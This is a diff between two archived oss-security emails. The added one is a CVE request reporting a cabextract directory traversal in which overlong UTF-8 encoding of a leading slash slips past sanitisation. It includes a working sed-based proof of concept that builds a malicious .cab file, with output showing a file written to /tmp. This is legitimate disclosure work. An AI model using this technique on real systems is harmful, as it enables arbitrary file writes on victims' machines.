@@ -1,19 +1,55 @@
 X-Archive-Source: openwall-scrape
-X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2015/02/13/8
-Message-ID: <Pine.LNX.4.64.1502130914100.2592@beijing.mitre.org>
-Date: Fri, 13 Feb 2015 09:16:12 -0500 (EST)
-From: cve-assign@...re.org
-To: Steffen Rösemann <steffen.roesemann1986@...il.com>
-cc: oss-security@...ts.openwall.com, cve-assign@...re.org
-Subject: Re: CVE Request -- CMS Sefrengo v.1.6.0 -- SQL injection and XSS vulnerabilities
+X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2015/02/18/3
+Message-ID: <54E4656B.3060606@openwall.com>
+Date: Wed, 18 Feb 2015 13:11:55 +0300
+From: Alexander Cherepanov <ch3root@...nwall.com>
+To: oss-security@...ts.openwall.com
+Subject: CVE Request: cabextract -- directory traversal
 Content-Type: text/plain; charset=utf-8
 
+Hi!
 
-CVE-2015-0918 and CVE-2015-0919 were already assigned and published in 
-January.
+cabextract is susceptible to a directory traversal vulnerability. While 
+extracting files from an archive, it removes leading slashes from 
+filenames but does it before possibly decoding UTF-8 and doesn't check 
+for invalid UTF-8. Hence an absolute filename can be shoved through by 
+using overlong encoding for the leading slash (and setting utf8 
+attribute in the header). This can be exploited by a malicious archive 
+to write files outside the current directory.
 
----
+Illustration:
 
-CVE assignment team, MITRE CVE Numbering Authority M/S M300
-202 Burlington Road, Bedford, MA 01730 USA
-[ PGP key available through http://cve.mitre.org/cve/request_id.html ]
+$ touch xxxxxxxxxx
+$ lcab xxxxxxxxxx test.cab
+$ sed -i 's|\x20\x00xxxxxxxxxx|\xa0\x00\xe0\x80\xaftmp/abs|g' test.cab
+$ rm xxxxxxxxxx
+
+$ ls /tmp/abs
+ls: cannot access /tmp/abs: No such file or directory
+
+$ ./cabextract test.cab
+Extracting cabinet: test.cab
+   extracting /tmp/abs
+
+All done, no errors.
+
+$ ls /tmp/abs
+/tmp/abs
+
+In the sed command above, \xe0\x80\xaf is an overlong encoding for '/', 
+\xa0\x00 are flags updated to include utf-8 flag.
+
+The issue was found in cabextract 1.4 and 2-byte encoding (\xc0\xaf) was 
+enough to hide '/'. cabextract 1.5 tightened utf-8 checks and 3-byte 
+encoding is now necessary.
+
+The issue was reported to Stuart Caie today and fixed in less than 4h:
+
+http://sourceforge.net/p/libmspack/code/217/
+
+Another release of cabextract is expected in the next few days.
+
+Could CVE please be assigned?
+
+-- 
+Alexander Cherepanov
